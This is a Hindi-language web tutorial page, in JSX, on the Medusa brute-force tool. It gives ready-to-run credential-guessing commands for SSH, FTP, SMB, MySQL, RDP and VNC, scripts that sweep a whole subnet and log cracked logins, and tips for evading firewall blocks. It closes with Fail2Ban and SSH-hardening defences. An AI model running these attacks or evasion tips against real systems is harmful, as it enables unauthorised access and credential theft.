import TutorialLayout from '../../components/TutorialLayout'
import CodeBlock from '../../components/CodeBlock'

export default function Medusa() {
  return (
    <TutorialLayout
      title="medusa"
      subtitle="तेज़ पैरलल नेटवर्क लॉगिन ऑडिटर — SSH, FTP, HTTP, SMB, MySQL ब्रूट फोर्स"
      icon="🐙"
      prev={{ to: '/tool/netdiscover', label: 'netdiscover' }}
      next={{ to: '/tool/airgeddon', label: 'airgeddon' }}
    >
      <h2>What is Medusa?</h2>
      <p>
        Medusa एक तेज़, पैरलल, मॉड्यूलर नेटवर्क ऑथेंटिकेशन ब्रूट फोर्स टूल है जो पेनेट्रेशन टेस्टर्स को विभिन्न सर्विसेज़ पर लॉगिन क्रेडेंशियल्स को क्रैक करने की अनुमति देता है। यह टूल हर टार्गेट के लिए नया कनेक्शन बनाता है और पैरलल प्रोसेसिंग का उपयोग करता है, जिससे यह कई बार Hydra से भी तेज़ काम करता है। Medusa 30+ सर्विसेज़ को सपोर्ट करता है — SSH, FTP, HTTP, SMB, MySQL, RDP, VNC, SNMP, Telnet, POP3, IMAP, SMTP, MSSQL, PostgreSQL और बहुत कुछ।
      </p>
      <p>
        Medusa का मुख्य फ़ायदा इसका मल्टी-होस्ट स्कैनिंग है। अगर आपको कई सर्वर्स पर एक साथ ब्रूट फोर्स करना है तो Medusa सबसे अच्छा विकल्प है। यह एक ही कमांड में कई होस्ट्स पर अटैक कर सकता है और हर कनेक्शन के लिए अलग थ्रेड बनाता है, जिससे फेल्ड कनेक्शन दूसरे अटेम्प्ट्स को प्रभावित नहीं करते। यह कनेक्शन आइसोलेशन Medusa को बहुत विश्वसनीय बनाता है।
      </p>
      <p>
        Medusa को Foofus Network Security के जॉनी कैलवेट (JoMo-Kun) ने 2005 में बनाया था। यह C भाषा में लिखा गया है जो इसे बहुत तेज़ और मेमोरी-एफिशिएंट बनाता है। यह ओपन सोर्स है और GitHub पर उपलब्ध है। Kali Linux और Parrot OS में यह प्री-इंस्टॉल्ड आता है। पेनेट्रेशन टेस्टिंग और सिक्योरिटी ऑडिट में यह एक ज़रूरी टूल है।
      </p>
      <p>
        Medusa का मॉड्यूलर आर्किटेक्चर इसे बहुत लचीला बनाता है। हर सर्विस के लिए अलग मॉड्यूल है जिसे कस्टमाइज़ किया जा सकता है। नए मॉड्यूल भी बनाए जा सकते हैं अगर कोई सर्विस सपोर्ट नहीं है। यह कॉम्बो फाइल्स, वर्डलिस्ट्स, और कस्टम क्रेडेंशियल्स सब सपोर्ट करता है। Medusa उन पेनेट्रेशन टेस्टर्स के लिए बनाया गया है जो स्पीड और रिलायबिलिटी दोनों चाहते हैं।
      </p>
      <p>
        Medusa का connection isolation model इसकी सबसे बड़ी technical advantage है। जब Hydra connection reuse करता है, तो एक failed login अगले attempt को affect कर सकता है — server connection reset कर सकता है या account lockout trigger हो सकता है। Medusa हर attempt के लिए fresh connection बनाता है, जिससे हर attempt independent होता है। यह design choice Medusa को unreliable networks और strict security policies वाले environments में बेहतर बनाता है।
      </p>

      <div className="warning-box mb-6">
        <strong>⚠️ कानूनी चेतावनी:</strong> Medusa केवल अधिकृत पेनेट्रेशन टेस्टिंग और सुरक्षा शोध के लिए उपयोग करें। बिना अनुमति के क्रेडेंशियल्स ब्रूट फोर्स करना अवैध है। भारत में आईटी एक्ट 2000 की धारा 43 और 66 के तहत अनधिकृत एक्सेस अपराध हो सकता है। केवल अपने लैब वातावरण या लिखित प्राधिकरण के साथ ही उपयोग करें।
      </div>

      <h2>History of Medusa</h2>
      <p>
        Medusa की शुरुआत 2005 में हुई थी जब Foofus Network Security के जॉनी कैलवेट (JoMo-Kun) ने एक तेज़ और विश्वसनीय ब्रूट फोर्स टूल की ज़रूरत को पहचाना। उस समय Hydra पहले से मौजूद था, लेकिन इसकी कुछ सीमाएँ थीं — कनेक्शन रीयूज़ के कारण कभी-कभी फेल्ड लॉगिन दूसरे अटेम्प्ट्स को प्रभावित करता था, और मल्टी-होस्ट सपोर्ट नहीं था।
      </p>
      <p>
        जॉनी ने Medusa को C भाषा में लिखा ताकि यह तेज़ और मेमोरी-एफिशिएंट हो। शुरू में यह सिर्फ SSH, FTP, और HTTP सपोर्ट करता था, लेकिन धीरे-धीरे 30+ मॉड्यूल जुड़ गए। 2008 में इसे ओपन सोर्स किया गया और Kali Linux (उस समय BackTrack) में शामिल किया गया। आज यह सबसे भरोसेमंद ब्रूट फोर्स टूल्स में से एक है।
      </p>
      <p>
        Medusa का डिज़ाइन दर्शन सरल है — हर कनेक्शन आइसोलेटेड होना चाहिए। अगर एक कनेक्शन फेल हो जाए तो दूसरे पर कोई असर नहीं पड़ना चाहिए। यह दृष्टिकोण Medusa को उन वातावरणों में बेहतर बनाता है जहाँ सर्वर अस्थिर हैं या नेटवर्क कनेक्शन कमज़ोर है। मल्टी-होस्ट सपोर्ट इसे नेटवर्क-वाइड ऑडिट के लिए आदर्श बनाता है।
      </p>

      <h2>How Medusa Works?</h2>
      <p>
        Medusa मॉड्यूलर आर्किटेक्चर और पैरलल प्रोसेसिंग का उपयोग करता है:
      </p>
      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2">
        <li><strong className="text-white">पैरलल इंजन:</strong> कई कनेक्शन एक साथ बनाता है — हर टार्गेट के लिए अलग थ्रेड</li>
        <li><strong className="text-white">मॉड्यूल सिस्टम:</strong> हर सर्विस के लिए अलग मॉड्यूल (SSH, FTP, HTTP, SMB, MySQL आदि)</li>
        <li><strong className="text-white">कनेक्शन आइसोलेशन:</strong> हर अटेम्प्ट के लिए नया कनेक्शन — फेल्ड कनेक्शन दूसरों को प्रभावित नहीं करता</li>
        <li><strong className="text-white">क्रेडेंशियल जनरेटर:</strong> वर्डलिस्ट और यूज़रनेम लिस्ट से क्रेडेंशियल्स जनरेट करता है</li>
        <li><strong className="text-white">मल्टी-होस्ट मैनेजर:</strong> एक साथ कई टार्गेट्स पर अटैक कर सकता है (-H फ्लैग)</li>
        <li><strong className="text-white">कॉम्बो फाइल सपोर्ट:</strong> host:user:password फॉर्मेट में क्रेडेंशियल्स दे सकते हो</li>
        <li><strong className="text-white">रिज़ल्ट रिपोर्टिंग:</strong> सफल लॉगिन को तुरंत रिपोर्ट करता है (-f फ्लैग से पहले मिलने पर रुक सकता है)</li>
        <li><strong className="text-white">थ्रेड कंट्रोल:</strong> -t और -T फ्लैग्स से पैरलल कनेक्शंस कंट्रोल कर सकते हो</li>
      </ul>

      <h2>Installation</h2>
      <p>
        Kali Linux में Medusa प्री-इंस्टॉल्ड आता है। अगर किसी कारण से नहीं है तो आसानी से इंस्टॉल कर सकते हैं।
      </p>
      <CodeBlock
        title="Medusa इंस्टॉलेशन"
        code={`# apt से इंस्टॉल (सबसे आसान):
sudo apt update
sudo apt install medusa

# सोर्स से इंस्टॉल (नवीनतम वर्जन):
git clone https://github.com/jmk-foofus/medusa.git
cd medusa
./configure
make
sudo make install

# वर्जन चेक:
medusa -V

# सभी उपलब्ध मॉड्यूल्स देखें:
medusa -d

# सहायता:
medusa -h`}
      />

      <h2>Basic Usage</h2>
      <p>
        Medusa का बेसिक इस्तेमाल बहुत सरल है — टार्गेट, यूज़रनेम, पासवर्ड लिस्ट, और मॉड्यूल दो।
      </p>
      <CodeBlock
        title="Medusa बेसिक कमांड्स"
        code={`# सिंगल यूज़र + वर्डलिस्ट से SSH लॉगिन:
medusa -h target_ip -u admin -P passwords.txt -M ssh

# FTP अटैक:
medusa -h target_ip -u admin -P passwords.txt -M ftp

# HTTP बेसिक ऑथ:
medusa -h target_ip -u admin -P passwords.txt -M http

# कई होस्ट्स पर अटैक:
medusa -H hosts.txt -u admin -P passwords.txt -M ssh

# MySQL अटैक:
medusa -h target_ip -u root -P passwords.txt -M mysql

# SMB अटैक (Windows):
medusa -h target_ip -u administrator -P passwords.txt -M smb

# RDP अटैक:
medusa -h target_ip -u admin -P passwords.txt -M rdp

# VNC अटैक (सिर्फ पासवर्ड):
medusa -h target_ip -P passwords.txt -M vnc`}
      />

      <h2>Important Options</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फ्लैग</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-h host</td><td className="py-2 px-3">टार्गेट होस्ट स्पेसिफाई करें</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-H file</td><td className="py-2 px-3">होस्ट्स लिस्ट फाइल (एक से ज़्यादा टार्गेट)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-u user</td><td className="py-2 px-3">सिंगल यूज़रनेम</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-U file</td><td className="py-2 px-3">यूज़रनेम लिस्ट फाइल</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-p pass</td><td className="py-2 px-3">सिंगल पासवर्ड</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-P file</td><td className="py-2 px-3">पासवर्ड लिस्ट फाइल</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-C file</td><td className="py-2 px-3">कॉम्बो फाइल (host:user:password)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-M module</td><td className="py-2 px-3">मॉड्यूल नाम (ssh, ftp, http, smb, mysql आदि)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-t threads</td><td className="py-2 px-3">प्रति होस्ट पैरलल लॉगिन (डिफ़ॉल्ट: 1)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-T total</td><td className="py-2 px-3">कुल पैरलल लॉगिन (सभी होस्ट्स मिलाकर)</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-n port</td><td className="py-2 px-3">डिफ़ॉल्ट पोर्ट के अलावा कोई और पोर्ट</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-f</td><td className="py-2 px-3">पहला वैलिड पासवर्ड मिलने पर रुको</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-F</td><td className="py-2 px-3">पहला वैलिड होस्ट मिलने पर रुको</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">-e nsu</td><td className="py-2 px-3">खाली पासवर्ड भी ट्राई करो (n=नो पासवर्ड, s=यूज़रनेम=पासवर्ड, u=यूज़रनेम रिवर्स)</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">-v</td><td className="py-2 px-3">वर्बोज़ आउटपुट — डिटेल्ड जानकारी</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Module System</h2>
      <p>
        Medusa 30+ मॉड्यूल्स सपोर्ट करता है। हर मॉड्यूल एक अलग सर्विस के लिए है। मॉड्यूल देखने के लिए <code>medusa -d</code> चलाओ।
      </p>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">मॉड्यूल</th>
              <th className="text-left py-2 px-3 text-neon-green">सर्विस</th>
              <th className="text-left py-2 px-3 text-neon-green">डिफ़ॉल्ट पोर्ट</th>
              <th className="text-left py-2 px-3 text-neon-green">क्या करता है</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">ssh</td><td className="py-2 px-3">SSH</td><td className="py-2 px-3">22</td><td className="py-2 px-3">Secure Shell लॉगिन</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">ftp</td><td className="py-2 px-3">FTP</td><td className="py-2 px-3">21</td><td className="py-2 px-3">FTP लॉगिन</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">http</td><td className="py-2 px-3">HTTP</td><td className="py-2 px-3">80</td><td className="py-2 px-3">HTTP बेसिक ऑथ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">https</td><td className="py-2 px-3">HTTPS</td><td className="py-2 px-3">443</td><td className="py-2 px-3">HTTPS बेसिक ऑथ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">smb</td><td className="py-2 px-3">SMB</td><td className="py-2 px-3">445</td><td className="py-2 px-3">Windows फाइल शेयरिंग</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">mysql</td><td className="py-2 px-3">MySQL</td><td className="py-2 px-3">3306</td><td className="py-2 px-3">MySQL डेटाबेस लॉगिन</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">rdp</td><td className="py-2 px-3">RDP</td><td className="py-2 px-3">3389</td><td className="py-2 px-3">Remote Desktop</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">vnc</td><td className="py-2 px-3">VNC</td><td className="py-2 px-3">5900</td><td className="py-2 px-3">VNC रिमोट एक्सेस</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">telnet</td><td className="py-2 px-3">Telnet</td><td className="py-2 px-3">23</td><td className="py-2 px-3">Telnet लॉगिन</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">snmp</td><td className="py-2 px-3">SNMP</td><td className="py-2 px-3">161</td><td className="py-2 px-3">SNMP कम्युनिटी स्ट्रिंग्स</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">pop3</td><td className="py-2 px-3">POP3</td><td className="py-2 px-3">110</td><td className="py-2 px-3">ईमेल रिट्रीवल</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">imap</td><td className="py-2 px-3">IMAP</td><td className="py-2 px-3">143</td><td className="py-2 px-3">ईमेल एक्सेस</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">smtp</td><td className="py-2 px-3">SMTP</td><td className="py-2 px-3">25</td><td className="py-2 px-3">ईमेल सेंडिंग</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white font-mono">mssql</td><td className="py-2 px-3">MSSQL</td><td className="py-2 px-3">1433</td><td className="py-2 px-3">Microsoft SQL Server</td></tr>
            <tr><td className="py-2 px-3 text-white font-mono">postgres</td><td className="py-2 px-3">PostgreSQL</td><td className="py-2 px-3">5432</td><td className="py-2 px-3">PostgreSQL डेटाबेस</td></tr>
          </tbody>
        </table>
      </div>

      <h2>SSH Attack</h2>
      <p>
        SSH (Secure Shell) सबसे कॉमन टार्गेट है। Linux सर्वर्स पर ब्रूट फोर्स अटैक करने के लिए SSH मॉड्यूल इस्तेमाल होता है।
      </p>
      <CodeBlock
        title="SSH ब्रूट फोर्स"
        code={`# सिंगल यूज़र:
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh

# कई यूज़र्स:
medusa -h 192.168.1.100 -U users.txt -P passwords.txt -M ssh

# कस्टम पोर्ट:
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -n 2222

# 5 पैरलल थ्रेड्स:
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -t 5

# पहला वैलिड पासवर्ड मिलने पर रुको:
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -f

# खाली पासवर्ड भी ट्राई करो:
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -e n`}
      />

      <h2>FTP Attack</h2>
      <p>
        FTP सर्वर्स अक्सर एनोनिमस एक्सेस अलाउ करते हैं। Medusa से FTP क्रेडेंशियल्स क्रैक कर सकते हो।
      </p>
      <CodeBlock
        title="FTP ब्रूट फोर्स"
        code={`# FTP अटैक:
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ftp

# एनोनिमस लॉगिन चेक:
medusa -h 192.168.1.100 -u anonymous -p anonymous -M ftp

# कई FTP सर्वर्स:
medusa -H ftp_servers.txt -u admin -P passwords.txt -M ftp

# कस्टम पोर्ट:
medusa -h 192.168.1.100 -u admin -P passwords.txt -M ftp -n 2121`}
      />

      <h2>HTTP Basic Auth Attack</h2>
      <p>
        वेब सर्वर्स पर HTTP बेसिक ऑथेंटिकेशन से प्रोटेक्टेड डायरेक्टरीज़ होती हैं। Medusa से इन क्रेडेंशियल्स क्रैक कर सकते हो।
      </p>
      <CodeBlock
        title="HTTP बेसिक ऑथ"
        code={`# HTTP बेसिक ऑथ:
medusa -h 192.168.1.100 -u admin -P passwords.txt -M http

# स्पेसिफिक पाथ:
medusa -h 192.168.1.100 -u admin -P passwords.txt -M http -m DIR:/admin

# HTTPS:
medusa -h 192.168.1.100 -u admin -P passwords.txt -M https

# कस्टम पोर्ट:
medusa -h 192.168.1.100 -u admin -P passwords.txt -M http -n 8080`}
      />

      <h2>SMB Attack (Windows)</h2>
      <p>
        SMB (Server Message Block) Windows फाइल शेयरिंग प्रोटोकॉल है। SMB मॉड्यूल से Windows क्रेडेंशियल्स क्रैक कर सकते हो।
      </p>
      <CodeBlock
        title="SMB ब्रूट फोर्स"
        code={`# SMB अटैक (Windows):
medusa -h 192.168.1.100 -u administrator -P passwords.txt -M smb

# डोमेन ऑथेंटिकेशन:
medusa -h 192.168.1.100 -u admin -P passwords.txt -M smb -m DOMAIN:WORKGROUP

# कई Windows होस्ट्स:
medusa -H windows_hosts.txt -U users.txt -P passwords.txt -M smb`}
      />

      <h2>MySQL Attack</h2>
      <p>
        MySQL डेटाबेस सर्वर पर ब्रूट फोर्स अटैक — रूट या कस्टम यूज़र के लिए।
      </p>
      <CodeBlock
        title="MySQL ब्रूट फोर्स"
        code={`# MySQL रूट लॉगिन:
medusa -h 192.168.1.100 -u root -P passwords.txt -M mysql

# कस्टम पोर्ट:
medusa -h 192.168.1.100 -u root -P passwords.txt -M mysql -n 3307

# कई यूज़र्स:
medusa -h 192.168.1.100 -U db_users.txt -P passwords.txt -M mysql`}
      />

      <h2>RDP and VNC Attack</h2>
      <CodeBlock
        title="RDP और VNC ब्रूट फोर्स"
        code={`# RDP अटैक (Remote Desktop):
medusa -h 192.168.1.100 -u administrator -P passwords.txt -M rdp

# RDP कस्टम पोर्ट:
medusa -h 192.168.1.100 -u admin -P passwords.txt -M rdp -n 3390

# RDP धीमा होता है — कम थ्रेड्स:
medusa -h 192.168.1.100 -u admin -P passwords.txt -M rdp -t 2

# VNC अटैक (सिर्फ पासवर्ड):
medusa -h 192.168.1.100 -P passwords.txt -M vnc

# VNC कस्टम पोर्ट:
medusa -h 192.168.1.100 -P passwords.txt -M vnc -n 5901`}
      />

      <h2>Batch Scanning</h2>
      <CodeBlock
        title="मल्टी-टार्गेट अटैक"
        code={`# होस्ट्स फाइल फॉर्मेट (एक IP प्रति लाइन):
# 192.168.1.100
# 192.168.1.101
# 192.168.1.102

# सभी होस्ट्स पर SSH अटैक:
medusa -H hosts.txt -u admin -P passwords.txt -M ssh

# कॉम्बो फाइल फॉर्मेट (host:user:password):
# 192.168.1.100:admin:admin123
# 192.168.1.101:root:toor

# कॉम्बो फाइल से अटैक:
medusa -H hosts.txt -C combo.txt -M ssh

# पहला वैलिड होस्ट मिलने पर रुको:
medusa -H hosts.txt -u admin -P passwords.txt -M ssh -F

# नेटवर्क रेंज स्कैन:
for ip in 192.168.1.{1..254}; do
  echo "[*] Scanning $ip..."
  medusa -h $ip -u admin -P passwords.txt -M ssh -t 3 -f
done`}
      />

      <h2>Performance Tuning</h2>
      <CodeBlock
        title="स्पीड ऑप्टिमाइज़ेशन"
        code={`# पैरलल थ्रेड्स बढ़ाओ:
# डिफ़ॉल्ट 1 थ्रेड — तेज़ नेटवर्क पर 10-20 यूज़ करो:
medusa -h target_ip -u admin -P passwords.txt -M ssh -t 20

# कुल पैरलल कनेक्शंस (कई होस्ट्स):
medusa -H hosts.txt -u admin -P passwords.txt -M ssh -T 50

# पहला वैलिड मिलने पर रुको (तेज़ एग्ज़िट):
medusa -h target_ip -u admin -P passwords.txt -M ssh -f

# मॉड्यूल-स्पेसिफिक टिप्स:
# SSH: 5-10 थ्रेड्स (सर्वर पर लोड डिपेंड)
# FTP: 10-20 थ्रेड्स (FTP सर्वर्स हैंडल कर लेते हैं)
# HTTP: 20-50 थ्रेड्स (वेब सर्वर्स ज़्यादा लोड हैंडल)
# RDP: 1-3 थ्रेड्स (RDP हैवी है)
# MySQL: 5-10 थ्रेड्स (डेटाबेस कनेक्शंस लिमिटेड)`}
      />

      <h2>Scripting and Automation</h2>
      <CodeBlock
        title="ऑटोमेटेड ब्रूट फोर्स स्क्रिप्ट"
        code={`#!/bin/bash
# Medusa ऑटोमेशन स्क्रिप्ट — सभी सर्विसेज़ टेस्ट करो

TARGET=$1
WORDLIST="/usr/share/wordlists/rockyou.txt"
USERS="/usr/share/wordlists/common_users.txt"

if [ -z "$TARGET" ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi

echo "[*] टार्गेट: $TARGET पर ब्रूट फोर्स शुरू..."

# कॉमन सर्विसेज़ टेस्ट करो:
SERVICES="ssh ftp http smb mysql vnc"

for service in $SERVICES; do
    echo "[*] $service टेस्ट हो रहा है..."
    medusa -h $TARGET -U $USERS -P $WORDLIST -M $service -t 5 -f -v 2>/dev/null
    if [ $? -eq 0 ]; then
        echo "[+] $service अटैक पूरा हुआ!"
    fi
done

echo "[*] सभी सर्विसेज़ टेस्ट हो गईं।"`}
      />

      <CodeBlock
        title="मल्टी-टार्गेट ऑटोमेशन"
        code={`#!/bin/bash
# नेटवर्क-वाइड ब्रूट फोर्स

NETWORK="192.168.1"
WORDLIST="/usr/share/wordlists/fasttrack.txt"
RESULTS="results.txt"

> $RESULTS

for ip in $NETWORK.{1..254}; do
    # पहले पोर्ट चेक करो:
    if nmap -p 22 --open $ip 2>/dev/null | grep -q "open"; then
        echo "[+] $ip पर SSH ओपन है — अटैक शुरू..."
        result=$(medusa -h $ip -u admin -P $WORDLIST -M ssh -t 3 -f 2>&1)
        if echo "$result" | grep -q "SUCCESS"; then
            echo "[!] $ip पर क्रेडेंशियल्स मिले!"
            echo "$ip: $(echo $result | grep SUCCESS)" >> $RESULTS
        fi
    fi
done

echo "[*] रिजल्ट्स $RESULTS में सेव हैं।"`}
      />

      <h2>Medusa vs Other Tools</h2>
      <div className="overflow-x-auto">
        <table className="w-full text-sm">
          <thead>
            <tr className="border-b border-neon-green/30">
              <th className="text-left py-2 px-3 text-neon-green">फ़ीचर</th>
              <th className="text-left py-2 px-3 text-neon-green">Medusa</th>
              <th className="text-left py-2 px-3 text-neon-green">Hydra</th>
              <th className="text-left py-2 px-3 text-neon-green">Ncrack</th>
              <th className="text-left py-2 px-3 text-neon-green">Patator</th>
            </tr>
          </thead>
          <tbody className="text-gray-400">
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">भाषा</td><td className="py-2 px-3">C</td><td className="py-2 px-3">C</td><td className="py-2 px-3">C++</td><td className="py-2 px-3">Python</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">प्रोटोकॉल्स</td><td className="py-2 px-3">30+</td><td className="py-2 px-3">50+</td><td className="py-2 px-3">12+</td><td className="py-2 px-3">25+</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">मल्टी-होस्ट</td><td className="py-2 px-3">हाँ (-H)</td><td className="py-2 px-3">एक होस्ट</td><td className="py-2 px-3">हाँ</td><td className="py-2 px-3">हाँ</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">कनेक्शन</td><td className="py-2 px-3">हर अटेम्प्ट के लिए नया</td><td className="py-2 px-3">कनेक्शन रीयूज़</td><td className="py-2 px-3">नया</td><td className="py-2 px-3">नया</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">स्पीड</td><td className="py-2 px-3">तेज़ (पैरलल)</td><td className="py-2 px-3">तेज़</td><td className="py-2 px-3">तेज़</td><td className="py-2 px-3">मीडियम</td></tr>
            <tr className="border-b border-dark-600"><td className="py-2 px-3 text-white">विश्वसनीयता</td><td className="py-2 px-3">बहुत विश्वसनीय</td><td className="py-2 px-3">अच्छी</td><td className="py-2 px-3">अच्छी</td><td className="py-2 px-3">अच्छी</td></tr>
            <tr><td className="py-2 px-3 text-white">मेंटेनेंस</td><td className="py-2 px-3">धीमा</td><td className="py-2 px-3">एक्टिव</td><td className="py-2 px-3">एक्टिव</td><td className="py-2 px-3">धीमा</td></tr>
          </tbody>
        </table>
      </div>

      <h2>Common Problems and Solutions</h2>
      <div className="space-y-3 mt-4">
        {[
          { q: 'कनेक्शन टाइमआउट हो रहा है', a: 'थ्रेड्स कम करो (-t 1)। नेटवर्क कनेक्टिविटी चेक करो: ping target_ip। पोर्ट ओपन है या नहीं: nmap -p 22 target_ip।' },
          { q: 'मॉड्यूल नहीं मिल रहा', a: 'medusa -d से उपलब्ध मॉड्यूल्स देखो। ls /usr/lib/medusa/modules/ से इंस्टॉल पाथ चेक करो।' },
          { q: 'ऑथेंटिकेशन फेल हो रहा है', a: 'वर्बोज़ मोड (-v) से डिटेल्ड आउटपुट देखो। क्रेडेंशियल फॉर्मेट चेक करो — यूज़रनेम फाइल में एक यूज़रनेम प्रति लाइन।' },
          { q: 'बहुत ज़्यादा कनेक्शंस बन रहे हैं', a: 'थ्रेड्स कम करो (-t 3)। फ़ायरवॉल ब्लॉक कर रहा होगा — IP रोटेट करो या वेट करो।' },
          { q: 'SMB मॉड्यूल काम नहीं कर रहा', a: 'डोमेन नेम स्पेसिफाई करो: -m DOMAIN:WORKGROUP। SMBv1 डिसेबल हो सकता है — nmap से चेक करो।' },
          { q: 'RDP बहुत धीमा है', a: 'RDP हैवी प्रोटोकॉल है — सिर्फ 1-3 थ्रेड्स यूज़ करो। -t 1 से शुरू करो और धीरे-धीरे बढ़ाओ।' },
          { q: 'कॉम्बो फाइल काम नहीं कर रही', a: 'फॉर्मेट चेक करो: host:user:password (कोलन से अलग)। -C फ्लैग से स्पेसिफाई करो।' },
          { q: 'फ़ायरवॉल ब्लॉक कर रहा है', a: 'थ्रेड्स कम करो, डिले बढ़ाओ। अलग-अलग पोर्ट्स ट्राई करो। प्रॉक्सी यूज़ करो।' },
        ].map((item, i) => (
          <div key={i} className="glass-card p-4">
            <h4 className="text-white font-mono font-semibold mb-2">Q: {item.q}</h4>
            <p className="text-gray-400 text-sm">A: {item.a}</p>
          </div>
        ))}
      </div>

      <h2>Detection and Defense</h2>
      <p>
        Medusa ब्रूट फोर्स अटैक्स से कैसे बचें — नेटवर्क एडमिन के लिए:
      </p>

      <h3>Fail2Ban Setup</h3>
      <CodeBlock
        title="Fail2Ban कॉन्फ़िगरेशन"
        code={`# Fail2Ban इंस्टॉल करें:
sudo apt install fail2ban

# SSH प्रोटेक्शन (/etc/fail2ban/jail.local):
[sshd]
enabled = true
port = ssh
filter = sshd
logpath = /var/log/auth.log
maxretry = 3
bantime = 3600
findtime = 600

# FTP प्रोटेक्शन:
[vsftpd]
enabled = true
port = ftp
filter = vsftpd
logpath = /var/log/vsftpd.log
maxretry = 3
bantime = 3600

# Fail2Ban स्टार्ट करें:
sudo systemctl start fail2ban
sudo systemctl enable fail2ban

# ब्लॉक किए गए IPs देखें:
sudo fail2ban-client status sshd`}
      />

      <h3>SSH हार्डनिंग</h3>
      <CodeBlock
        title="SSH सिक्योरिटी"
        code={`# SSH कॉन्फ़िग (/etc/ssh/sshd_config):

# पासवर्ड ऑथेंटिकेशन डिसेबल:
PasswordAuthentication no

# की-बेस्ड ऑथेंटिकेशन:
PubkeyAuthentication yes

# रूट लॉगिन डिसेबल:
PermitRootLogin no

# मैक्स ऑथ अटेम्प्ट्स:
MaxAuthTries 3

# स्पेसिफिक यूज़र्स अलाउ:
AllowUsers admin

# नॉन-स्टैंडर्ड पोर्ट:
Port 2222

# SSH रीस्टार्ट:
sudo systemctl restart sshd`}
      />

      <h3>लॉग मॉनिटरिंग</h3>
      <CodeBlock
        title="लॉग एनालिसिस"
        code={`# फेल्ड SSH अटेम्प्ट्स देखें:
grep "Failed password" /var/log/auth.log | tail -20

# IP-वाइज़ काउंट:
grep "Failed password" /var/log/auth.log | \\
  awk '{print $11}' | sort | uniq -c | sort -rn

# ऑटोमेटेड ब्लॉकिंग स्क्रिप्ट:
#!/bin/bash
THRESHOLD=5
grep "Failed password" /var/log/auth.log | \\
  awk '{print $11}' | sort | uniq -c | sort -rn | \\
  while read count ip; do
    if [ "$count" -gt "$THRESHOLD" ]; then
      echo "ब्लॉक कर रहे हैं: $ip ($count अटेम्प्ट्स)"
      sudo iptables -A INPUT -s $ip -j DROP
    fi
  done`}
      />

      <ul className="list-disc list-inside text-gray-300 mb-4 space-y-2 mt-4">
        <li><strong className="text-white">Fail2Ban:</strong> ऑटोमैटिक IP ब्लॉकिंग — 3 फेल्ड अटेम्प्ट्स पर 1 घंटे का बैन</li>
        <li><strong className="text-white">एकाउंट लॉकआउट:</strong> PAM मॉड्यूल से एकाउंट लॉकआउट पॉलिसी</li>
        <li><strong className="text-white">रेट लिमिटिंग:</strong> iptables से कनेक्शन रेट लिमिट</li>
        <li><strong className="text-white">की-बेस्ड ऑथ:</strong> पासवर्ड ऑथेंटिकेशन पूरी तरह डिसेबल करो</li>
        <li><strong className="text-white">टू-फैक्टर ऑथ:</strong> Google Authenticator या Duo के साथ 2FA लगाओ</li>
